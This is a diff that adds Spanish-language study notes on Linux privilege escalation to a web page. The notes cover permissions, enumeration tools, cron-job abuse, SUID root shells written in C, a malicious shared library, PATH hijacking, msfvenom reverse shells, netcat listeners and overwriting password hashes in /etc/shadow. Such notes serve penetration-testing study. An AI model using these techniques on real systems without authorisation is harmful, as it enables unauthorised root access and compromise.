@@ -59,7 +59,253 @@
       
     </div>
     <div class="content">
-      <p>Escalacion de privilegios Linux</p>
+      <p>#======================================================================================================================================
+#================================================= PRIVILEGE ESCALATION LINUX =========================================================
+#======================================================================================================================================
+$PERMISOS</p>
+<p>En linux los permisos se establecen entres niveles:</p>
+<ul>
+<li>Permisos de propietario</li>
+<li>Permisos del grupo</li>
+<li>Permisos del resto de usr (&ldquo;otros&rdquo;)</li>
+</ul>
+<p>-Las cunetas de usr se configuran en /etc/passwd
+-Los hash de las contraseñas se almacenana en /etc/shadow
+-Cada uno de los usuarios se identifican bajo un identificador llamado UID (User Identifier)
+-Hay 3 tipos de UID definidos para un proceso:
+*Real: es la cta del propietario de este proceso. Define a que files tiene acceso este proceso.
+*Effective: Lo mismo que realID, pero aveces se cambia para permitir que un usr sin privilegios acceda a files de usr root
+*Save: se usa cuando un proceso q se ejecuta con privilegios de root necesita hacer un trabajo poco privilegiado, esto se puede lograr cambiando temporalmente a una cta no privilegiada
+-Los grupos de usr  se configuran en /etc/group, por default el grupo rpincipal del usr  tiene el mismo
+nombre como su cuenta de usuario
+-Todos los files y directoriosposeen un unico propietario y un unico grupo y los permisos se definen como:
+lecturta (r) escritura (w) y ejecucion (x)
+-Existen 3 conjuntos de permisos uno para propietario otro para grupo y uno para todos los &ldquo;otros&rdquo;</p>
+<pre><code>             U   G   O
+            rwx rwx rwx     =&gt;  rwx rwx rwx
+            111 111 111          7   7   7
+</code></pre>
+<p>-Sólo el propietario del directorio o file puede cambiar los permisos
+-cada 3 caracteres se refiere a los permisos de propietario grupo y otros
+-Hay otro tipo de permisos. se trata del bit de permisos SUID (Set User ID), el bit de permisos SGID (Set Group ID)
+Estos permisos estan representados por una &lsquo;S&rsquo; en la posicion de executcion
+-SUID es asignable a ficheros ejecutables y permite q cuando un usr ejecute dicho file, el proceso adquiera los permisos del propietario del file ejecutado.
+-GUID permite adquirir los permisos del grupo asignado al file, tambien es asignable a directorios. Esto sera muy util cuando
+varios usrs del mismo grupo necesiten trabajar con recursos dentro de un mismo directorio.</p>
+<hr>
+<hr>
+<hr>
+<p>$METODOLOGIA</p>
+<ol>
+<li>Identificar el usuario y los privilegios que tiene                                                               **NOTA:
+$whoami                                                                                                                 - Realizar pruebas con cosas que no requieran muchos pasos por ejemplo:
+$id                                                                                                                        sudo, cronjobs, archivos SUID</li>
+<li>Identificar la version del sistema                                                                                       - Revisar procesos root enumerar versiones y buscar exploits de esa version <br>
+$uname -a
+$cat /etc/*release</li>
+<li>Identificacion de debilidades en el sistema (aplicaciones, servicios, permisos, etc)
+$lse -i l2
+$Linenum -s -k passwd //busca archivos con pass hardcodeados</li>
+<li>Numeracion manual
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
+<li>Revisar archivos en escritorio o en /var/backup, /var/logs, historial de comandos</li>
+</ol>
+<hr>
+<hr>
+<hr>
+<p>$TOOLS (Github)</p>
+<p>-Linux Smart Enumeration
+-LinEnum
+-Linux-Exploit suggester-2 (Principalmente para buscar exploit de kernel)
+-PSPY
+-LinuxPriceChecker
+-Unix-Privesec-chek</p>
+<hr>
+<hr>
+<hr>
+<p>$TAREAS CRON (tareas programadas)
+-Es una tarea q se ejecuta a nivel de sistema a intervalos de tiempo (cada minuto, cada 3 hrs, etc)
+En /etc/crontab se encuentran todos los archivos cron configurados
+-Para crear una tarea cron se guarda un file en /etc/cron.d y se inicia el demonio cron
+-La estructura de la tarea cron tiene 5 campos</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><!-- raw HTML omitted --> <!-- raw HTML omitted --></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>|   |   |   |   |
+|   |   |   |   |_______________ dia de la semana (1-7)
+|   |   |   |___________________ mes (1-12)
+|   |   |_______________________ dia de mes (1-31)
+|   |___________________________ Hora (0-23)
+|_______________________________ min (0-59)</p>
+<ul>
+<li>Para explotar tareas cron hacemos numerasion para ver q comandos se estan ejecutando
+$ps -eo command</li>
+<li>Buscar si hay tareas cron o binarios que se ejecuten en segundo plano</li>
+<li>Revisar que permisos tienen ese binario y si tiene permisos de escrituraes posible editar ese binario para cambiar permisos a la /bin/bash (ej. chmod 4755 /bin/bash)</li>
+<li>Despues de agregar permisos SUID a la bash lanzamos bash -p</li>
+</ul>
+<hr>
+<hr>
+<hr>
+<p>$CREASION DE SHELL</p>
+<p>SHELL ASROOT
+-Una de las formas es realizar una copia del binario /bin/bash usualmente lo llamammos &ldquo;asroot&rdquo;, para realizar esto nos aseguraremos que el binario mantenga las propiedades
+del usr root y que tenga el bit SUID establecido
+-Posterior a la copia ejecutamos el binario como &ldquo;asroot -p&rdquo; para ganar acceso root</p>
+<p>SHELL COMPILADA
+-Puede haber casos en los q algun proceso root ejecuta otro proceso que puede controlar, el siguiente codigo C genera una shell bash root
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main ()
+{
+setuid(0);
+system(&quot;/bin/bash -p&quot;);
+}
+-Para compilar el archivo .c
+gcc -wall -m32 -o linux-shell file.c  //Para 32 bits
+gcc -wall -m64 -o linux-shell file.c  //Para 64 bits</p>
+<p>SHELL MSFVENOM
+msfvenom -p linux/shell_inverse_tcp LHOST=<!-- raw HTML omitted --> LPORT=<!-- raw HTML omitted --> -f elf &gt; shell.elf</p>
+<p>REVSHELL
+-Se generan diferentes tipos de shell nativas (.py, .pl, .php, mknod, .rb, etc) con la herramienta revshell desarrollada por dplastico la cual nos ayudara a escalar privilegios de forma nativas</p>
+<p>Para resivir esas conexiones se utlizara un listener de netcat
+#nc -lvnp <!-- raw HTML omitted -->  // se recomiendan usar puertos comunes Ej. 80,443,53,etc</p>
+<hr>
+<hr>
+<hr>
+<p>$EXPLOITS DE kernel</p>
+<p>-Enumerar la version de kernel (#uname -a)
+-Buscar un explot para la version</p>
+<hr>
+<hr>
+<hr>
+<p>$EXPLOITS DE SERVICIOS</p>
+<h2 id="-buscar-algun-exploit">-Un servicio es un programa q se ejecuta en segundo plano cuando inica el SO y aseptan entradas o realizan tareas regulares
+-si los servicios se ejecutan como root, explotarlos puede conducir a la ejecucion de comandos root
+-Numerar los procesos que se ejecutan como root
+$ ps aux | grep &ldquo;^root&rdquo;
+-Dentro los resultados obtenidos intente identificar el versionado o enumerar Ej:
+$<!-- raw HTML omitted --> -v/&ndash;version
+dpkg -l | grep <!-- raw HTML omitted -->
+rpm -qa |grep <!-- raw HTML omitted -->
+-Buscar algun exploit</h2>
+<hr>
+<hr>
+<p>$EXPLOTANDO PERMISOS DE ARCHIVOS (SUID/SGID)</p>
+<p>-Se pueden aprovechar ciertos files del sistema para realizar escalada de privilegiada                                                                 ***NOTA:
+-Si un file tien informacion confidencial q podamos leer, este puede ser utlizado para obtener acceso root                                                      El hash de shadow es sha512 y se puede crear
+-Si se puede escribir en un file podemos modificar la forma en que funciona y obtener acceso root                                                               un pass con:</p>
+<ul>
+<li>Para verificar permisos debiles en un file buscamos programas q establescan el bit setui                                                                      mkpasswd -m sha-512 nuevopass
+$ find / -type f -perm 0400 -ls 2&gt;/dev/null                                                                                                         y poder sustituirlo en /etc/shadow
+-buscamos todos los archivos que podamos leer y escribir en /etc                                                                                                con:
+$ find /etc -maxdepth 1 -readable -type f                                                                                                           openssl passwd &ldquo;nuevopass&rdquo;
+creamos un hash de pass para sustituirlo en /etc/passwd
+-Hay algunos comandos ejecutables  que pueden permitir escalacion de privilegios: bash, cat, cp, echo, find, less, more, nano, nmap, vim, etc
+-Asi como se pueden usar secuencias de escape de shell con programas q se ejecutan con sudo, podemos hacer lo mismo con los files SUID/SGID
+Ej:
+1. numeramos con lse o de manera manual en busca de binarios consetuid
+find / -type f -a (-perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2&gt;/dev/null //numeracion manual
+2.verificamos versionado de los binarios y buscamos vulnerabilidades para escalar privilegios</li>
+</ul>
+<hr>
+<hr>
+<hr>
+<p>$ARCHIVO BACKUP</p>
+<p>-Una maquina puede tener los permisos bien configurados, pero un usr pudo haber crado copias de seguridad insegura de estos archivos
+-Siempre vale la pena explorar el sistema de archivos en busca de archivos de respaldo legibles. Algunos paths comunes incluyen directorios de inicio de usr
+/root, /tmp, /var/backups</p>
+<hr>
+<hr>
+<hr>
+<p>$ESCALACION CON SUDO</p>
+<p>-SU permite usar la terminal de otro usr sin necesidad de cerrar sesion.
+-A diferencia de SU, SUDO pide a los usr su propia contraseña en lugar de la del usr requerido
+-Enlistar programas permitidos por SUDO
+$sudo -l</p>
+<hr>
+<hr>
+<hr>
+<p>$PATH HAIJACKING</p>
+<p>-El archivo que ejecuta un comando de manera relativa re quiere permisoso SUID
+-Buscar archivos con permisos SUID o 400
+find / -perm -u=s -type f 2&gt;/dev/null
+-Crear un binario y damos permisos de ejecucion
+-Alteramos el PATH con la ruta del binario creado
+-Ej:
+cd /tmp
+echo &ldquo;bash -p&rdquo; &gt; archivomalo.sh //Creando archivo bin para que abra una bash
+chmod +x archivomalo.sh
+export PATH=/tmp:$PATH //secuestrando el path
+cd /home/usuario
+./archivo_que_ejecuta_comandos</p>
+<hr>
+<hr>
+<hr>
+<p>$INYECTION DE OBJETOS COMPARTIDOS (SUID)</p>
+<p>-Cuando se ejecuta un rpograma este intentara cargar los objetivos compartidos que requiere para su ejecucion
+-Al usar un programa llamado &ldquo;strace&rdquo; podemos rastrear estas llamadas al sistema y determinar si no se encontraron objetos compartidos
+-Si podemos escribir en la ubicacion que el programa intenta abrir, podemos crear un objeto compartido y generar una shell root
+Ej:
+1. numeramos binarios
+find / -type f -a (-perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2&gt;/dev/null //numeracion manual
+2. tracqueamos el binario para ver q librerias compartidas que usa y cuales faltan para crear una maliciosa
+strace &lt;path_binario&gt;
+3. creamos la libreria con el mismo nombre
+vi libcalc.c
+=code=
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main ()
+{
+setuid(0);
+system(&quot;/bin/bash -p&quot;);
+}
+4. compilamos y despues lo movemos al path de donde es llamado
+gcc -shared -fPIC -o libcalc.so libcalc.c
+5.finalmente ejecutamos denuevo el binario</p>
+<hr>
+<hr>
+<hr>
+<p>$NFS</p>
+<p>-Identificacion de servicios NFS
+nmap -p 111 &ndash;script nfs* <!-- raw HTML omitted -->
+mount -o rw,vers=2 <!-- raw HTML omitted -->:<!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<hr>
+<hr>
+<hr>
+<p>$CAPABILITIES (Persistencia privilegiada)
+-Numerar capabilities en binarios
+getcap -r / 2&gt;/dev/null</p>
+<ul>
+<li>revisar las cap_setiud principalmente</li>
+</ul>
+<hr>
+<hr>
+<hr>
+<p>$CONTRASEÑAS</p>
+<p>-Indagar en archivos de configuracion o en el historial de comandos
+-Con la tool LinEnum podemos hacer una busqueda por la palabra password
+linenum.sh -s -k password</p>
+<p>OPENVPN
+-Identificar archivos .ovpn</p>
 
     </div>
   </div>
